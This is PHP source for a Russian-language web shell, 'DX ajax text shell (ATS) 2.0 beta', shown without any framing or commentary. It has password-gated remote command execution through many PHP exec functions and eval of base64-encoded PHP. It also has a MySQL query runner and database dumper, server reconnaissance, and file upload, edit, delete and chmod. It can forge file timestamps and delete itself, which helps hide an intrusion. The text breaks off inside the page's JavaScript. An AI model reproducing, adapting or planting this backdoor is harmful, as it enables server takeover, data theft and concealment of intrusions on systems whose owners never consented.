<?php
@set_time_limit(0);
@ini_set('max_execution_time',0);

$ver='2.0 beta';

$auth=true; //включить ли защиту паролем
$username=md5('admin'); //логин
$userpass=md5('admin'); //пасс

if($auth)
{
  if(!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$username || md5($_SERVER['PHP_AUTH_PW'])!==$userpass)
  {
    header('WWW-Authenticate: Basic realm="ATS"');
    header('HTTP/1.0 401 Unauthorized');
    die('Access denied');
  }
}


if(isset($_POST['delscript']))
{
  if(@unlink(__FILE__))
    ajax_die("alert('Скрипт успешно удалён.');");
  else
    ajax_die("alert('Не удалось удалить скрипт.');");
}


function get_os_type()
{
  $dir=@getcwd();
  $unix= strlen($dir)>1 && $dir[1]==':' ? 0 : 1;
  if(empty($dir))
  {
    $os=getenv('OS');
    if(empty($os))
      $os=php_uname();

    if(empty($os))
    {
      $unix=1;
    } 
    else
    {
      $unix= preg_match('/win/i',$os) ? 0 : 1;
    }
  }

  return $unix;
}

$is_unix=get_os_type();

$sdir=str_replace('\\','/',$_SERVER['DOCUMENT_ROOT'].dirname($_SERVER['SCRIPT_NAME']));
$fname=basename($_SERVER['SCRIPT_NAME']);

if(isset($_POST['sqlr']) && !is_array($_POST['sqlr']))
{
  $port=isset($_POST['port']) && !is_array($_POST['port']) ? (isset($_POST['dump']) ? $_POST['port'] : @base64_decode($_POST['port'])) : '';
  $sqlr=isset($_POST['dump']) ? trim($_POST['sqlr']) : trim(@base64_decode($_POST['sqlr']));
  $user=isset($_POST['sqluser']) && !is_array($_POST['sqluser']) ? (isset($_POST['dump']) ? trim($_POST['sqluser']) : trim(@base64_decode($_POST['sqluser']))) : '';
  $pass=isset($_POST['pass']) && !is_array($_POST['pass']) ? (isset($_POST['dump']) ? trim($_POST['pass']) : trim(@base64_decode($_POST['pass']))) : '';
  $dbname=isset($_POST['dbname']) && !is_array($_POST['dbname']) ? (isset($_POST['dump']) ? trim($_POST['dbname']) : trim(@base64_decode($_POST['dbname']))) : '';
  $host=isset($_POST['host']) && !is_array($_POST['host']) ? (isset($_POST['dump']) ? trim($_POST['host']) : trim(@base64_decode($_POST['host']))) : '';

  $sqlrun=isset($_POST['sqlrun']) && !is_array($_POST['sqlrun']) ? trim($_POST['sqlrun']) : '';

  if(strlen($host)<1)
  {
    if(isset($_POST['dump'])) ifr_die('Не введён хост MySQL.'); else ajax_die("alert('Не введён хост MySQL.');");
  }

  if(!preg_match("/^\d+$/",$port))
  {
    if(isset($_POST['dump'])) ifr_die('Введён недопустимый порт MySQL.'); else ajax_die("alert('Введён недопустимый порт MySQL');");
  }

  if(strlen($sqlr)<1)
  {
    if(isset($_POST['dump'])) ifr_die('Не введён dump-запрос.'); else ajax_die("alert('Не введён MySQL-запрос.');");
  }


  $res1=@mysql_connect($host.':'.$port,$user,$pass);


  if(!$res1)
  {
    if(isset($_POST['dump'])) ifr_die('Ошибка подключения к MySQL.'); else ajax_die("setSqlRes(\"".get_merr()."\");");
  }


  if(strlen($dbname)>0 && !@mysql_select_db($dbname))
  {
    if(isset($_POST['dump'])) ifr_die('Ошибка подключения к БД.'); else ajax_die("setSqlRes(\"".get_merr('',$res1)."\");");
  }


  $enc=isset($_POST['enc']) && !is_array($_POST['enc']) ? trim($_POST['enc']) : '';
  $senc=isset($_POST['senc']) && !is_array($_POST['senc']) ? mysql_real_escape_string(trim($_POST['senc'])) : '';
  if($senc)
  {
    if(!@mysql_query("SET NAMES '$senc'"))
        ifr_die('Ошибка при установке кодировки соединения.');

    if(function_exists('mysql_set_charset'))
      @mysql_set_charset($senc);
  }


  if(isset($_POST['dump']))
  {
    $curr=isset($_POST['curr']) && !is_array($_POST['curr']) ? trim($_POST['curr']) : 0;

    if(!preg_match("/^\d+$/",$curr))
      ifr_die('Неверно введена начальная строка.');

    $curr2=$curr;

    $usercnt=isset($_POST['usercnt']) && !is_array($_POST['usercnt']) ? trim($_POST['usercnt']) : 0;

    if(!preg_match("/^\d+$/",$usercnt))
      ifr_die('Неверно задано число строк таблицы для дампа.');


    if(preg_match("/^\[DUMPSQL\] (\S+)$/i",$sqlr,$m))
    {
      if(!$sqlrun)
        ifr_die('Введите SQL-запрос.');

      $res=@mysql_query($sqlrun);
      if(!$res || !is_resource($res))
        ifr_die('Ошибка при выполнении sql-запроса.');

      header('Content-Description: File Transfer');
      header('Content-Disposition: attachment; filename="dumpSQL.txt"');
      header('Content-Transfer-Encoding: binary');
      header('Content-Type: application/octet-stream');

      $rlen=strlen($m[1]);

      while($row=@mysql_fetch_row($res))
      {
        $ret='';
        foreach($row as $rval)
        {
          $ret.=$rval.$m[1];
        }

        print_flush(substr($ret,0,strlen($ret)-$rlen)."\r\n");
      }


      @mysql_free_result($res);
      die();
    }






    if(preg_match("/^\[DUMP\] (\S+)$/i",$sqlr,$m))
    {
      $dumpall= $sqlr=='[DUMP] *' ? true : false;


      if($dumpall)
      {
        if(strlen($dbname)<1)
          ifr_die('Введите имя БД для дампа.');
        $res=@mysql_query('show tables');
        if(!$res || !is_resource($res))
          ifr_die('Ошибка получения списка таблиц БД.');

        if(@mysql_num_rows($res)<1)
        {
          @mysql_free_result($res);
          ifr_die('В БД не найдено ни одной таблицы.');
        }

        $tblarr=Array();

        while($row=@mysql_fetch_row($res))
        {
          $tblarr[]=$row[0];
        }

        @mysql_free_result($res);

        $dmpname=$dbname;
      }
      else
      {
        $tblarr=Array(0 => $m[1]);
        $dmpname=$m[1];
      }

      $headerssent=0;

      foreach($tblarr as $tbl)
      {
        $tbl=mysql_real_escape_string($tbl);

        $res2=@mysql_query("SHOW CREATE TABLE $tbl");
        if(!$res2 || !is_resource($res2))
        {
          $res2=@mysql_query("show full columns from $tbl");
          if(!$res2 || !is_resource($res2))
          {
            $res2=@mysql_query("describe $tbl");
            if(!$res2 || !is_resource($res2))
              ifr_die('Ошибка при выполнении SQL-запроса.');
          }

          $ret='create table '.$tbl.' (';

          $add4='';
          $i=0;

          while($row=@mysql_fetch_assoc($res2))
          {
            $add1=$row['Null']=='YES' ? ' ' : ' not null ';

            $add3=$row['Default'] ? " default '".mysql_real_escape_string(myconv2($row['Default'],$enc))."'" : '';

            if($row['Key']=='PRI')
            {
              $add4.=$row['Field'].', ';
            }
            else if($row['Key']=='UNI')
            {
              $add2=' unique';
            }

            if(isset($row['Collation']) && $row['Collation']!='NULL' && $row['Collation']!=NULL)
              $add5=' collate '.$row['Collation'].' ';
            else
              $add5='';

            if($row['Extra']) $row['Extra']=' '.$row['Extra'];

            $ret.=$row['Field'].' '.$row['Type'].$add5.$add1.$add3.$add2.$row['Extra'].', ';
            $i++;
          }

          $ret=substr($ret,0,strlen($ret)-2);

          if($add4)
          {
            $add4=', primary key('.substr($add4,0,strlen($add4)-2).')';
            $ret.=$add4;
          }

          $ret.=');';
        }
        else
        {
          $ret=@mysql_fetch_array($res2);
          $ret=preg_replace('/(default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP|DEFAULT CHARSET=\w+|COLLATE=\w+|character set \w+|collate \w+)/i','/*!40101 \\1 */',$ret);
          $ret=$ret[1];
        }

        @mysql_free_result($res2);

        $res=@mysql_query("select count(1) as cnt from $tbl");
        if(!$res || !is_resource($res))
          ifr_die('Ошибка выполнения SQL-запроса.');

        if(@mysql_num_rows($res)<1)
        {
          @mysql_free_result($res);
          ifr_die('Ошибка выполнения SQL-запроса.');
        }

        $dbcnt=@mysql_result($res,0,'cnt');
        $cnt=$usercnt>0 ? $usercnt : $dbcnt;
        @mysql_free_result($res);

        if(!$headerssent)
        {
          header('Content-Description: File Transfer');
          header('Content-Disposition: attachment; filename="dump_'.$dmpname.'.txt"');
          header('Content-Transfer-Encoding: binary');
          header('Content-Type: application/octet-stream');
          $headerssent=1;
        }


        print_flush($ret."\r\n\r\n");

        $curr=$curr2;

        if($curr<$dbcnt) print 'insert into '.$tbl.' values ';

        while($curr<=$cnt)
        {
          $res=@mysql_query("select * from $tbl limit $curr,1500");
          if(!$res || !is_resource($res))
            die('Ошибка при выполнении SQL-запроса.');

          while($row=@mysql_fetch_row($res))
          {
            $ret='(';

            foreach($row as $rval)
            {
              $ret.="'".mysql_real_escape_string(myconv2($rval,$enc))."', ";
            }

            $ret=substr($ret,0,strlen($ret)-2);

            print_flush($ret.'), ');
          }


          @mysql_free_result($res);

          $curr+=1500;
        }


        print "\r\n\r\n\r\n";
      }

      die();
    }
    else
    {
      ifr_die('Dump-запрос введён в неверном формате.');
    }
  }


  $res=@mysql_query($sqlr);

  if(!$res)
    ajax_die("setSqlRes(\"".get_merr('',$res1)."\");");

  if(is_resource($res))
  {
    $ret="<table cellpadding=1 cellspacing=1 class='smalltext'><tr align=center valign=center>";
    $i=0;
    while($row=@mysql_fetch_field($res,$i))
    {
      $ret.="<td class='head'>".htmlspecialchars($row->name).'</td>';
      $i++;
    }

    $ret.='</tr>';

    while($row=@mysql_fetch_row($res))
    {
      $ret.='<tr valign=top>';

      foreach($row as $rval)
      {
        $ret.='<td>'.htmlspecialchars($rval).'</td>';
      }

      $ret.='</tr>';
    }

    $ret.='</table>';

    @mysql_free_result($res);

    $res=$ret;
  }
  else
  {
    $res="Запрос выполнен успешно.<br>Затронуто рядов в таблице: ".@mysql_affected_rows();
  }

  ajax_die(get_mysql_info($res1)."document.getElementById('sqlres').innerHTML=\"{$res}\";");
}

function get_merr($addtxt='',$res=0)
{
  $ret=base64_encode('<b>Ошибка:</b><br>'.$addtxt.'<br>'.htmlspecialchars(mysql_error()));
  if($res) mysql_close($res);
  return $ret;
}

function ifr_die($t)
{
  header("Content-type: text/html; charset=utf-8");
  die("<html><head><meta http-equiv='Content-Type' content='text/html;charset=utf-8'></head><body><script language='JavaScript'>alert('$t');</script></body></html>");
}

function print_flush($t)
{
  echo $t;
  @flush();
  @ob_flush();
}


function cmd_conv($t)
{
  global $is_unix;
  $ret= $is_unix ? str_replace(Array("\r","\n",' '),Array('','<br>','&nbsp;'),myconv(htmlspecialchars($t))) : str_replace(Array("\r","\n",' '),Array('','<br>','&nbsp;'),myconv(htmlspecialchars(@convert_cyr_string($t,'d','w'))));
  return "<html><body style=\"font-family:'Courier','Lucida Console';font-size:14px;\">".$ret."</body></html>";
}


if(isset($_POST['cmd']) && !is_array($_POST['cmd']))
{
  $tp=isset($_POST['tp']) && !is_array($_POST['tp']) ? $_POST['tp'] : '0';

  $c=$_POST['cmd'];
  if(get_magic_quotes_gpc())
    $c=stripslashes($c);

  if(strlen($c)<1)
    die('<html><body>Enter command.</body></html>');


  switch($tp)
  {
    case '8':
      if(!function_exists('pcntl_exec'))
        die('pcntl_exec does not exist.');

      if(pcntl_exec($c)===false)
        print "Error executing command.";
      else
        print "OK.";
    break;

    case '7':
      print cmd_conv(@shell_exec($c));
    break;

    case '6':
      $descriptorspec=array(0=>array("pipe", "r"), 1 => array("pipe", "w"));
      $process=@proc_open($c,$descriptorspec,$pipes);

      if(is_resource($process))
      {
        print cmd_conv(stream_get_contents($pipes[1]));
        @proc_close($process);
      }
      else
      {
        print "Error executing command.";
      }
    break;

    case '5':
      @ob_start();
      @passthru($c);
      $ret=cmd_conv(ob_get_contents());
      @ob_end_clean();
      print $ret;
    break;

    case '4':
      print cmd_conv(`$c`);
    break;

    case '3':
      $out='';
      @exec($c,$out);
      print(implode('<br>',array_map('cmd_conv',$out)));
    break;

    case '2':
      @ob_start();
      @system($c);
      $ret=cmd_conv(ob_get_contents());
      @ob_end_clean();
      print $ret;
    break;

    case '1':
    default:
      $handle=@popen($c,'r');
      $ret='';
      while(!feof($handle))
      {
        $ret.=fgets($handle,1024);
      }

      @pclose($handle);
      print cmd_conv($ret);
  }

  die();
}


if(isset($_POST['php']) && !is_array($_POST['php']))
{
  $c=isset($_POST['noutf']) ? myconv(@base64_decode($_POST['php']),1) : @base64_decode($_POST['php']);

  @ob_start();
  @eval($c);

  if(isset($_POST['htmlsc']))
  {
    $ret=isset($_POST['noutf']) ? myconv(base64_encode(htmlspecialchars(@ob_get_contents()))) : base64_encode(htmlspecialchars(@ob_get_contents()));
  }
  else
  {
    $ret=isset($_POST['noutf']) ? myconv(base64_encode(@ob_get_contents())) : base64_encode(@ob_get_contents());
  }

  @ob_end_clean();
  ajax_die("setRes('$ret');");
}

if(isset($_POST['mysql']))
  ajax_die(get_mysql_info());


if(isset($_POST['getinfo']))
{
  $info='';

  $info.='<b>PHP</b>: '.phpversion().'<br>';
  $info.='<b>PHP OS</b>: '.PHP_OS.'<br>';
  if(function_exists('php_uname')) $info.='<b>PHP OS</b>: '.php_uname().'<br>';
  if(function_exists('zend_version')) $info.='<b>Zend</b>: '.zend_version().'<br>';
  if(function_exists('apache_get_version')) $info.='<b>Apache</b>: '.apache_get_version().'<br>';
  $info.='<b>Register_globals</b>: '.( ini_get('register_globals') ? 'ON' : 'OFF').'<br>';
  $f=ini_get('disable_functions');
  if(function_exists('apache_get_modules')) $info.='<b>Apache модули</b>: '.implode(', ',apache_get_modules()).'<br>';

  if(@ini_get('safe_mode')=='1')
	$info.='<b>Safe Mode</b>: ON<br>';
  else
    $info.='<b>Safe Mode</b>: OFF<br>';

  $info.='<b>Недоступные функции</b>: '.($f ? $f : 'нет').'<br>';

  if(function_exists('sys_get_temp_dir')) $info.='<b>Temp dir</b>: '.str_replace('\\','/',sys_get_temp_dir()).'<br>';
  $info.='<b>Magic quotes gpc</b>: '.(get_magic_quotes_gpc() ? 'ON' : 'OFF').'<br>';
  if(function_exists('get_current_user')) $info.='<b>Current user</b>: '.get_current_user().'<br>';
  if(function_exists('get_loaded_extensions')) $info.='<b>Загруженные модули PHP</b>: '.implode(', ',get_loaded_extensions()).'<br>';

  if(function_exists('getmyuid') && function_exists('getmygid'))
    $info.='<b>Uid</b>: '.getmyuid().' <b>Gid</b>: '.getmygid();

  ajax_die("document.getElementById('mdl1').innerHTML=\"<b>Информация о системе</b><br><br>{$info}\";");
}

if(isset($_POST['newfilename']) && !is_array($_POST['newfilename']) && isset($_POST['fl']) && !is_array($_POST['fl']))
{
  if(!isset($_FILES['newfile']['name']) || !file_exists($_FILES['newfile']['tmp_name']))
    die('<html><body>0</body></html>');

  $fl=$_POST['fl'];
  if(get_magic_quotes_gpc())
    $fl=stripslashes($fl);

  $fl=myconv($fl,1);
  $fl=str_replace('\\','/',$fl);
  $fl=preg_replace("/[\/]+$/s",'',$fl);

  if(strlen($fl)<1 || !file_exists($fl))
  {
    @unlink($_FILES['newfile']['tmp_name']);
    die('<html><body>2</body></html>');
  }

  if(get_magic_quotes_gpc())
    $_POST['newfilename']=stripslashes($_POST['newfilename']);

  $p=$_POST['newfilename'];
  $p=myconv($p,1);

  if(preg_match('/[\\\\"\/]+/is',$p) || strlen($p)<1)
  {
    @unlink($_FILES['newfile']['tmp_name']);
    die('<html><body>1</body></html>');
  }

  if(file_exists($fl.'/'.$p))
  {
    @unlink($_FILES['newfile']['tmp_name']);
    die('<html><body>3</body></html>');
  }

  if(@move_uploaded_file($_FILES['newfile']['tmp_name'],$fl.'/'.$p))
  {
    die('<html><body>5*'.$fl.'</body></html>');
  }
  else
  {
    @unlink($_FILES['newfile']['tmp_name']);
    die('<html><body>4</body></html>');
  }
}

if(isset($_POST['dir']) && !is_array($_POST['dir']))
{
  if(get_magic_quotes_gpc())
    $_POST['dir']=stripslashes($_POST['dir']);

  $dr=str_replace('\\','/',$_POST['dir']);
  $dr=preg_replace("/([^\/]+)[\/]+$/s",'$1',$dr);
  $dr=myconv($dr,1);

  if(!file_exists($dr) || !is_dir($dr))
    ajax_die("alert('Директория не существует.');");

  $xadd='';
  if(is_writable($dr))
    $xadd='В эту директорию можно производить запись.';

  $d=@opendir($dr);
  if(!$d)
    ajax_die("alert('Ошибка открытия директории. Возможно, недостаточно прав.');");

  $ret=$ret2=$ret3='';
  $dirarr=$farr=Array();
  $el=readdir($d);

  $prev=$dr;
  for($i=strlen($dr)-1;$i--;$i>=0)
  {
    if($dr{$i}=='/')
    {
      $prev=substr($dr,0,$i);
      break;
    }
  }

  $i=0;

  while($el)
  {
    if($el=='..')
    {
      $ret3="<tr><td class='w0'>..</td><td><a href='javascript:void(0);' onclick='getDir(\\\"".myconv(str_replace(Array("'",'\\'),Array("&#39;",'/'),$prev))."\\\");'>Вверх</a></td><td class='w1'>-</td><td class='w1'>-</td><td class='w1'>-</td></tr>";
    }
    else if($el!='.')
    {
      if(filetype($dr.'/'.$el)=='dir')
      {
        $dirarr[$i][0]=$el;
        $dirarr[$i][1]=$dr.'/'.$el;
      }
      else if(filetype($dr.'/'.$el)=='file')
      {
        $farr[$i][0]=$el;
        $farr[$i][1]=$dr.'/'.$el;
      }
    }

    $i++;

    $el=readdir($d);
  }

  closedir($d);

  usort($dirarr,'namesort');
  usort($farr,'namesort');

  foreach($dirarr as $direlem)
  {
    $ret2.="<tr><td class='w0'><a href='javascript:void(0);' onclick='showFileMenu(\\\"".myconv(str_replace("'","&#39;","{$direlem[1]}"))."\\\",event,1);'>[dir]</a></td><td><a href='javascript:void(0);' onclick='getDir(\\\"".myconv(str_replace(Array("'",'\\'),Array("&#39;",'/'),$direlem[1]))."\\\");'>".cutlen(myconv(str_replace("'","&#39;",$direlem[0])))."</a></td><td class='w1'>".filestats($direlem[1])."</td><td class='w1'>-</td><td class='w1'>".myfiletime($direlem[1])."</td></tr>";
  }

  foreach($farr as $felem)
  {
    $ret.="<tr><td class='w0'>&nbsp;</td><td><a href='javascript:void(0);' onclick='showFileMenu(\\\"".myconv(str_replace("'","&#39;",$felem[1]))."\\\",event);'>".cutlen(myconv(str_replace("'","&#39;",$felem[0])))."</a></td><td class='w1'>".filestats($felem[1])."</td><td class='w1'>".myfilesize($felem[1])."</td><td class='w1'>".myfiletime($felem[1])."</td></tr>";
  }

  ajax_die("set_files(\"$xadd<br><table class='ftable' cellpadding=1 cellspacing=1><tr class='hd' align=center><td>&nbsp;</td><td>Имя</td><td>Права</td><td>Размер</td><td>Изменён</td></tr>$ret3$ret2$ret</table>\",\"".myconv($dr)."\");");
}

if(isset($_POST['fileact']) && !is_array($_POST['fileact']) && isset($_POST['params']) && !is_array($_POST['params']) && isset($_POST['fl']) && !is_array($_POST['fl']))
{
  $p=$_POST['params'];
  if(get_magic_quotes_gpc())
    $p=stripslashes($p);

  $fl=$_POST['fl'];
  if(get_magic_quotes_gpc())
    $fl=stripslashes($fl);

  $p=myconv($p,1);
  $fl=myconv($fl,1);

  $fl=str_replace('\\','/',$fl);
  $p=preg_replace("/[\/]+$/s",'',$p);
  $fl=preg_replace("/[\/]+$/s",'',$fl);

  if(strlen($fl)<1 || !file_exists($fl))
    ajax_die("alert('Выбран несуществующий файл.');");

  switch($_POST['fileact'])
  {
    case '1':
      if(preg_match('/[\\\\"\/]+/is',$p) || strlen($p)<1)
        ajax_die("alert('Недопустимое имя файла.');");

      $dname=dirname($fl);
      $newname=$dname.'/'.$p;

      if(file_exists($newname))
        ajax_die("alert('Файл с таким именем уже существует.');");

      if(@rename($fl,$newname))
        ajax_die("alert('Файл успешно переименован.');getDir(\"".str_replace('\\','/',myconv($dname))."\");");
      else
        ajax_die("alert('Не удалось переименовать файл.');");
    break;

    case '2':
      if(strlen($p)<1)
        ajax_die("alert('Недопустимое имя файла.');");

      if(file_exists($p))
        ajax_die("alert('Файл с таким именем уже существует в выбранной директории.');");

      if(@rename($fl,$p))
        ajax_die("alert('Файл успешно перемещён.');getDir(\"".str_replace('\\','/',myconv(dirname($p)))."\");");
      else
        ajax_die("alert('Не удалось переместить файл.');");
    break;

    case '3':
      if(strlen($p)<1)
        ajax_die("alert('Недопустимое имя файла.');");

      if(file_exists($p))
        ajax_die("alert('Файл с таким именем уже существует в выбранной директории.');");

      if(@copy($fl,$p))
        ajax_die("alert('Файл успешно скопирован.');getDir(\"".str_replace('\\','/',myconv(dirname($p)))."\");");
      else
        ajax_die("alert('Не удалось скопировать файл.');");
    break;

    case '4':
      if(is_dir($fl))
      {
        if(rmdir_recurse($fl) && @rmdir($fl))
          ajax_die("alert('Директория успешно удалена.');getDir(\"".str_replace('\\','/',myconv(dirname($fl)))."\");");
        else
          ajax_die("alert('Не удалось удалить директорию.');");
      }
      else
      {
        if(@unlink($fl))
          ajax_die("alert('Файл успешно удалён.');getDir(\"".str_replace('\\','/',myconv(dirname($fl)))."\");");
        else
          ajax_die("alert('Не удалось удалить файл.');");
      }
    break;

    case '5':
      if(!preg_match("/^[0-7]{3}$/s",$p))
        ajax_die("alert('Укажите права к файлу - 3 цифры от 0 до 7.');");

      if(@chmod($fl,decoct($p)))
        ajax_die("alert('Права выставлены успешно.');getDir(\"".str_replace('\\','/',myconv(dirname($fl)))."\");");
      else
        ajax_die("alert('Не удалось выставить права.');");
    break;

    case '6':
      if(!preg_match("/^(\d{2})\-(\d{2})\-(\d{4}) (\d{2}):(\d{2}):(\d{2})$/s",$p,$m))
        ajax_die("alert('Неверный формат даты. Используйте ДД-ММ-ГГГГ ЧЧ:ММ:СС');");

      if(!checkdate($m[2],$m[1],$m[3]) || $m[4]>23 || $m[5]>59 || $m[6]>59)
        ajax_die("alert('Введена несуществующая дата.');");

      if(@touch($fl,mktime($m[4],$m[5],$m[6],$m[2],$m[1],$m[3])))
        ajax_die("alert('Дата успешно установлена.');getDir(\"".str_replace('\\','/',myconv(dirname($fl)))."\");");
      else
        ajax_die("alert('Не удалось установить дату.');");
    break;

    case '9':
    case '7':
      $f=@file_get_contents($fl);
      if($f===false)
      {
        ajax_die("alert('Не удалось открыть файл.');");
      }
      else
      {
        $txt=$_POST['fileact']=='9' ? base64_encode($f) : base64_encode(myconv($f));
        $txt2=$_POST['fileact']=='9' ? ' (UTF-8)' : '';

        ajax_die("openEdit(\"".myconv(basename($fl))."$txt2\",'$txt');");
      }
    break;

    case '10':
      $t=isset($_POST['txt']) && !is_array($_POST['txt']) ? $_POST['txt'] : '';
      $f=@fopen($fl,'w');
      if(!$f)
        ajax_die("alert('Не удалось открыть файл.');");

      @flock($f,LOCK_EX);

      $t=isset($_POST['utf']) ? @base64_decode($t) : myconv(@base64_decode($t),1);

      if(!@fputs($f,$t))
      {
        @flock($f,LOCK_UN);
        @fclose($f);
        ajax_die("alert('Не удалось произвести запись в файл.');");
      }

      @flock($f,LOCK_UN);
      @fclose($f);

      ajax_die("alert('Файл успешно сохранён.');getDir(\"".str_replace('\\','/',myconv(dirname($fl)))."\");");
    break;

    case '8':
      $ff=@fopen($fl,'r');
      if(!$ff)
        ifr_die('Не удалось открыть файл.');

      header('Content-Description: File Transfer');
      header('Content-Disposition: attachment; filename="'.basename($fl).'"');
      header('Content-Transfer-Encoding: binary');
      header('Content-Type: application/octet-stream');

      while(!feof($ff))
      {
        print_flush(fgets($ff,2048));
      }

      fclose($f);
      die();
    break;

    case '11':
      if(preg_match('/[\\\\"\/]+/is',$p) || strlen($p)<1)
        ajax_die("alert('Недопустимое имя директории.');");

      if(file_exists($fl.'/'.$p))
        ajax_die("alert('Директория с таким именем уже существует в каталоге.');");

      if(@mkdir($fl.'/'.$p))
        ajax_die("alert('Директория успешно создана.');getDir(\"".str_replace('\\','/',myconv($fl))."\");document.getElementById('newdir').value='';");
      else
        ajax_die("alert('Ошибка при создании директории.');");
    break;
  
    default:
      ajax_die("alert('Недопустимое действие.');");
  }
}

header("Content-type: text/html; charset=utf-8");

print <<<HERE
<html><head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<title>DX ajax text shell (ATS) $ver</title>
<style>
table
{
border-width:1px;
border-style:solid;
border-color:gray;
border-collapse:collapse;
}
td
{
border-width:1px;
border-style:solid;
border-color:gray;
}

.smalltext,.smalltext td
{
font-size:11;
}

td.head
{
background-color:gold;
}

body
{
FONT-FAMILY:Arial, Helvetica, sans-serif;
FONT-SIZE:12px;
}
.w0
{
width:10px;
FONT-FAMILY:Arial, Helvetica, sans-serif;
FONT-SIZE:12px;
}
.w1
{
FONT-FAMILY:Arial, Helvetica, sans-serif;
FONT-SIZE:12px;
text-align:center;
}
a {
COLOR: #5555aa;
FONT-FAMILY:Arial, Helvetica, sans-serif;
FONT-SIZE:12px;
TEXT-DECORATION:none;
}
a:active {
COLOR: #111177;
FONT-FAMILY:Arial, Helvetica, sans-serif;
FONT-SIZE:12px;
TEXT-DECORATION:none;
}
a:hover {
COLOR: #111177;
FONT-FAMILY:Arial, Helvetica, sans-serif;
FONT-SIZE:12px;
TEXT-DECORATION:underline;
}
.w0 a{
COLOR: red;
}

INPUT,button
{
BORDER-RIGHT: rgb(50,50,50) 1px outset;
BORDER-TOP: rgb(50,50,50) 1px outset;
FONT-SIZE: 11px;
font-family:Arial;
BORDER-LEFT: rgb(50,50,50) 1px outset;
BORDER-BOTTOM: rgb(50,50,50) 1px outset;
}

textarea
{
BORDER-RIGHT: rgb(50,50,50) 1px outset;
BORDER-TOP: rgb(50,50,50) 1px outset;
BORDER-LEFT: rgb(50,50,50) 1px outset;
BORDER-BOTTOM: rgb(50,50,50) 1px outset;
FONT-SIZE: 13px;
font-family:Arial;
}

select
{
font-size:12px;
}

.fmenu
{
width:300px;
border-width:2px;
border-style:solid;
border-color:black;
background-color:white;
padding:2px 2px 2px 2px;
}

.header
{
font-size:14;
font-weight:bold;
}

fieldset
{
width:325px;
}
</style>
<script language='JavaScript'>
function createHttpRequest()
{
  var uagent=navigator.userAgent.toLowerCase();
  var is_win=((uagent.indexOf("win")!=-1) || (uagent.indexOf("16bit")!=-1));
  var is_opera=(uagent.indexOf('opera')!=-1);
  var is_webtv=(uagent.indexOf('webtv')!=-1);
  var is_safari=((uagent.indexOf('safari')!=-1) || (navigator.vendor=="Apple Computer, Inc."));
  var is_ie=((uagent.indexOf('msie')!=-1) && (!is_opera) && (!is_safari) && (!is_webtv));

  if(is_ie)
    httpRequest=new ActiveXObject("Microsoft.XMLHTTP");
  else
    httpRequest=new XMLHttpRequest();

  return httpRequest;
}

var httpRequest=createHttpRequest();
var cdir="";

function sendRequest(proc,params)
{
showLoading();
httpRequest.open('POST','$fname',true);
httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpRequest.setRequestHeader("Content-length", params.length);
httpRequest.setRequestHeader("Connection", "close");
httpRequest.onreadystatechange=proc;
httpRequest.send(params);
}

function showLoading()
{
document.getElementById('loading').style.top=document.body.scrollTop;
document.getElementById('loading').style.display='block';
}

function hideLoading()
{
document.getElementById('loading').style.display='none';
}

function getRequestx()
{
if(httpRequest.readyState==4)
{
try{
hideLoading();
var htr=httpRequest.responseText;
htr=htr.substring(htr.indexOf('<codestart>')+11);
}
catch(e)
{
alert('Ошибка JS: '+e);
}
try{
eval(htr);
}
catch(e)
{
alert('Не удалось выполнить JS. (ERR: '+e+')');
}
}
}

function checkNow()
{
  if(document.getElementById('loading').style.display=='block')
  {
    alert('Пожалуйста, дождитесь завершения текущей операции');
    return false;
  }
  else
  {
    return true;
  }
}

function getDir(d)
{
  if(!checkNow()) return false;
  if(!d) d="$sdir";
  hideMenus();
  sendRequest(getRequestx,"dir="+d);
}

function set_files(t,cat)
{
  document.getElementById('flist').innerHTML=t;
  document.getElementById('gdir').value=cat;
  cdir=cat;
}

function gotodir()
{
  getDir(document.getElementById('gdir').value);
}

var curfile='';
var curdir='';
var curfilename='';


function showFileMenu(f,e,tp)
{
  if(!tp) tp=0;
  hideMenus();
  if(!e) e=event;
  var fname;

  for(var i=f.length-1;i--;i>=0)
  {
    if(f.substr(i,1)=='/')
    {
      fname=f.substr(i+1);
      break;
    }
  }

  curfile=f;
  curfilename=fname;

  if(!tp)
  {
    document.getElementById('fmenu').style.left=e.clientX;
    document.getElementById('fmenu').style.top=e.clientY+document.body.scrollTop;
    document.getElementById('fnam').innerHTML="<b>Файл "+fname+"</b><hr>";
    document.getElementById('fmenu').style.display='block';
    showAdds(document.getElementById('act1').value);
  }
  else
  {
    document.getElementById('fmenu2').style.left=e.clientX;
    document.getElementById('fmenu2').style.top=e.clientY+document.body.scrollTop;
    document.getElementById('fnam2').innerHTML="<b>Каталог "+fname+"</b><hr>";
    document.getElementById('fmenu2').style.display='block';
    showAdds(document.getElementById('act2').value,'adds2');
  }
}



function hideMenus()
{
  document.getElementById('fmenu').style.display='none';
  document.getElementById('fmenu2').style.display='none';
  document.getElementById('ediv').style.display='none';
}

function showAdds(v,id)
{
  if(!id) id="adds";
  document.getElementById('adds').innerHTML="";
  document.getElementById('adds2').innerHTML="";
  switch(v)
  {
    case "1":
      document.getElementById(id).innerHTML="Новое имя: <input type='text' id='addtxt' value=\""+curfilename+"\">";
    break;
    case "2":
      document.getElementById(id).innerHTML="Переместить в: <input type='text' id='addtxt' value=\""+curfile+"\"><br>(Укажите путь и имя файла.)";
    break;
    case "3":
      document.getElementById(id).innerHTML="Копировать в: <input type='text' id='addtxt' value=\""+curfile+"\"><br>(Укажите путь и имя файла.)";
    break;
    case "5":
      document.getElementById(id).innerHTML="Права: <input type='text' id='addtxt' value='777'>";
    break;
    case "6":
      var today=new Date();
      var h=today.getHours();
      var m=today.getMinutes();
      var s=today.getSeconds();
      if(s<10) s="0"+s;
      if(m<10) m="0"+m;
      if(h<10) h="0"+h;
      var month=today.getMonth()+1;
      var day=today.getDate();
      if(month<10) month="0"+month;
      if(day<10) day="0"+day;
      var year=today.getFullYear();

      document.getElementById(id).innerHTML="Дата: <input type='text' id='addtxt' value='"+day+"-"+month+"-"+year+" "+h+":"+m+":"+s+"'>";
    break;
    default:
      document.getElementById(id).innerHTML='';
  }
}

function FileDo(id)
{
  if(!checkNow()) return false;
  if(!id) id='act1';
  if(document.getElementById(id).value=="0")
  {
    alert('Выберите действие.');
    return false;
  }

  hideMenus();
  var params='&params=';
  if(document.getElementById('addtxt'))
    params="&params="+document.getElementById('addtxt').value;

